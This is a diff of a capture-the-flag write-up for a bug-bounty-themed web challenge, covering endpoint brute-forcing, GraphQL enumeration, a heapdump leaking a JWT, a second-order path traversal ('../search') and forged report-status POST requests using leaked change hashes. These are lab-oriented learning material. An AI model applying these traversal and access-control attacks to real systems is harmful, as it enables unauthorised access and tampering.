@@ -43,27 +43,33 @@ We're also given a `wordlist.txt`, so I assumed it's for brute-forcing the login
 Used the wordlist to brute endpoints, found:
 
 {% code overflow="wrap" %}
+
 ```
 /api
 /api/v1
 /api/v2
 ```
+
 {% endcode %}
 
 All of them mention this `.war` file:
 
 {% code overflow="wrap" %}
+
 ```json
 { "server": "openjdk:19-jdk:bountyapi.war", "message": "BugBountyPlatform API" }
 ```
+
 {% endcode %}
 
 `/api/v1` warns it's deprecated — maybe that means vulnerable?
 
 {% code overflow="wrap" %}
+
 ```json
 { "server": "openjdk:19-jdk:bountyapi.war", "message": "Deprecated, please use v2" }
 ```
+
 {% endcode %}
 
 Also found `/dashboard` and `/settings` — both redirect to `/login`.
@@ -73,33 +79,41 @@ Also found `/dashboard` and `/settings` — both redirect to `/login`.
 At this point, I remembered the challenge literally says we need to mess with STÖK's report. Guessed `/reports`. Nothing on `/api` or `/api/v1`, but `/api/v2` returns:
 
 {% code overflow="wrap" %}
+
 ```json
 { "error": "Missing Required Fields" }
 ```
+
 {% endcode %}
 
 Tried fuzzing keys like:
 
 {% code overflow="wrap" %}
+
 ```
 /api/v2/reports?fuzz=1
 ```
+
 {% endcode %}
 
 But all the responses were the same length. Then I tried REST-style:
 
 {% code overflow="wrap" %}
+
 ```
 /api/v2/reports/fuzz
 ```
+
 {% endcode %}
 
 Still nothing — always got `"Invalid Unknown Endpoint"`. Out of desperation I asked ChatGPT (lol), and it suggested:
 
 {% code overflow="wrap" %}
+
 ```
 /api/v2/reports?user_id=123
 ```
+
 {% endcode %}
 
 That actually worked — gave `Invalid User ID`. Tried some IDs, usernames, numbers, fuzzed 1–1000 — still nothing.
@@ -107,9 +121,11 @@ That actually worked — gave `Invalid User ID`. Tried some IDs, usernames, numb
 Then I re-read the challenge and realized I’m an idiot. They gave creds in the description:
 
 {% code overflow="wrap" %}
+
 ```
 hacker:password123
 ```
+
 {% endcode %}
 
 Logged in — finally. The dashboard shows a pending SSRF -> RCE report.
@@ -129,9 +145,11 @@ While messing with that, I saw GraphQL requests in Burp. Right-click → GraphQL
 Now we can actually see the GraphQL queries and endpoint structure. Found:
 
 {% code overflow="wrap" %}
+
 ```
 /api/reports?user_id=...
 ```
+
 {% endcode %}
 
 Never would’ve guessed that during brute-force.
@@ -149,9 +167,11 @@ Apparently there are 6 total though 🤔
 With the UIDs from the GraphQL output, I try:
 
 {% code overflow="wrap" %}
+
 ```
 /api/v2/reports?user_id=15ee453d-18c7-419b-a3a6-ef8f2cc1271f
 ```
+
 {% endcode %}
 
 Checked each user — nothing else. Tried adding `password` to the GetUser query — causes a schema error.
@@ -163,6 +183,7 @@ Checked each user — nothing else. Tried adding `password` to the GetUser query
 Spotted a JS file: `/assets/js/chat-widget.js`
 
 {% code overflow="wrap" %}
+
 ```js
 const response = await fetch("/api/v2/chat", {
     method: "POST",
@@ -170,6 +191,7 @@ const response = await fetch("/api/v2/chat", {
     body: JSON.stringify({ message }),
 });
 ```
+
 {% endcode %}
 
 Initially thought the chat button was hidden. Turns out I'm just blind — bottom-right of the screen.
@@ -203,14 +225,16 @@ Flag: `flag_6{9c2001f18f3b997187c9eb6d8c96ba60}`
 
 Turns out flag 6 was a bonus — back to enumeration.
 
-### Flag 1
+### Robots.txt
 
 Found `/robots.txt`:
 
 {% code overflow="wrap" %}
+
 ```
 /internal-dash
 ```
+
 {% endcode %}
 
 Flag: `flag_1{858c82dc956f35dd1a30c4d47bcb57fb}`
@@ -219,7 +243,7 @@ Discovered `/internal-dash/login` shortly after. Tried fuzzing more stuff inside
 
 Reviewed GraphQL schema again, tried loading it in Voyager — didn’t get anything new.
 
-## Missed Flags (Recap)
+## Missed Flags (Summary)
 
 Didn’t finish the challenge, but looked up the paths for 2, 3, and 5 afterward. For the sake of completeness, here's what was missed.
 
@@ -232,9 +256,11 @@ Remember the `openjdk:19-jdk:bountyapi.war` we found in the API response? Since 
 Using the new `heapdump` endpoint, we'd see a request from Inti on a new endpoint: `/api/v1/internal-dashboard/token` including an auth token:
 
 {% code overflow="wrap" %}
+
 ```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImludGkifQ.YeqvfQ7L25ohhwBE5Tpmqo2_5MhqyOCXE7T9bG895Uk
 ```
+
 {% endcode %}
 
 We can make a POST request to this endpoint, and it will create us an `Internal dashboard token`: `a1c2860d05f004f9ac6b0626277b1c36e0d30d66bb168f0a56a53ce12f3f0f7a`
@@ -258,53 +284,66 @@ On `/internal-dash/`, the "lookup report" feature is vulnerable to a **second-or
 Submitting `../` reveals two hidden endpoints:
 
 {% code overflow="wrap" %}
+
 ```
 /search
 /my-reports
 ```
+
 {% endcode %}
 
 Since we already have STÖK’s `user_id`, we can get their reports:
 
 {% code overflow="wrap" %}
+
 ```
 /api/v2/reports?user_id=15ee453d-18c7-419b-a3a6-ef8f2cc1271f
 ```
+
 {% endcode %}
 
 One of them is the Yahoo report — grab the ID:
 
 {% code overflow="wrap" %}
+
 ```
 c03dd42e-d929-4a50-9a8e-1ab6b2dd5e8a
 ```
+
 {% endcode %}
 
 Now use `/search` with that ID:
 
 {% code overflow="wrap" %}
+
 ```
 ../search?q=c03dd42e-d929-4a50-9a8e-1ab6b2dd5e8a
 ```
+
 {% endcode %}
 
 That returns a `change_hash`:
 
 {% code overflow="wrap" %}
+
 ```
 2ea965e581705b5678fb9c95ab743b0b
 ```
+
 {% endcode %}
 
 Use it to change the status of STÖK’s report via:
 
 {% code overflow="wrap" %}
+
 ```
 POST /internal-dash/api/report/status
 ```
+
 {% endcode %}
 
 {% code overflow="wrap" %}
+
 ```json
 {
     "id": "c03dd42e-d929-4a50-9a8e-1ab6b2dd5e8a",
@@ -312,6 +351,7 @@ POST /internal-dash/api/report/status
     "change_hash": "2ea965e581705b5678fb9c95ab743b0b"
 }
 ```
+
 {% endcode %}
 
 Do the same with your own report (ID: `f9aa28ef-7008-424e-86fb-4271b131b155`) to get a change hash.
@@ -319,6 +359,7 @@ Do the same with your own report (ID: `f9aa28ef-7008-424e-86fb-4271b131b155`) to
 Then promote yourself to confirmed:
 
 {% code overflow="wrap" %}
+
 ```json
 {
     "id": "f9aa28ef-7008-424e-86fb-4271b131b155",
@@ -326,6 +367,7 @@ Then promote yourself to confirmed:
     "change_hash": "da80eece7d2e15e210ebf02fc94b072e"
 }
 ```
+
 {% endcode %}
 
 After that, check your dashboard — the flag is in the title of your report status.
